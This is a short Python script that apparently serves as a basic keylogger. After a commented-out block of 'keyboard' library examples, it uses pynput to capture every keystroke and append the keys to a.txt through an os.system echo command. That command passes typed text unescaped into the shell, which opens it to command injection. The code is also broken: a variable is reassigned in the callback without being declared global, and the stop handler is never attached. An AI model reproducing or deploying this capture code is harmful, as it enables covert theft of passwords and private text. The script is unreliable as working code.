'''
import keyboard

keyboard.press_and_release('shift+s, space')

keyboard.write('The quick brown fox jumps over the lazy dog.')

keyboard.add_hotkey('ctrl+shift+a', print, args=('triggered', 'hotkey'))

# Press PAGE UP then PAGE DOWN to type "foobar".
keyboard.add_hotkey('page up, page down', lambda: keyboard.write('foobar'))

# Blocks until you press esc.
keyboard.wait('esc')

# Record events until 'esc' is pressed.
recorded = keyboard.record(until='esc')
# Then replay back at three times the speed.
keyboard.play(recorded, speed_factor=3)

# Type @@ then press space to replace with abbreviation.
keyboard.add_abbreviation('@@', 'my.long.email@example.com')

# Block forever, like `while True`.
keyboard.wait()
'''

import os
from pynput import keyboard as kb

lst = []

def pulsa(tecla):
    if str(tecla) == 'Key.space':
        os.system('echo ' + str(lst) + ' >> ' + 'a.txt')
        lst = []

    else:
        lst.append(str(tecla))

def suelta(tecla):
    	if tecla == kb.KeyCode.from_char('q'):
    		return False

escuchador = kb.Listener(pulsa)
escuchador.start()

try:
    while escuchador.is_alive():
        pass

except KeyboardInterrupt:
    pass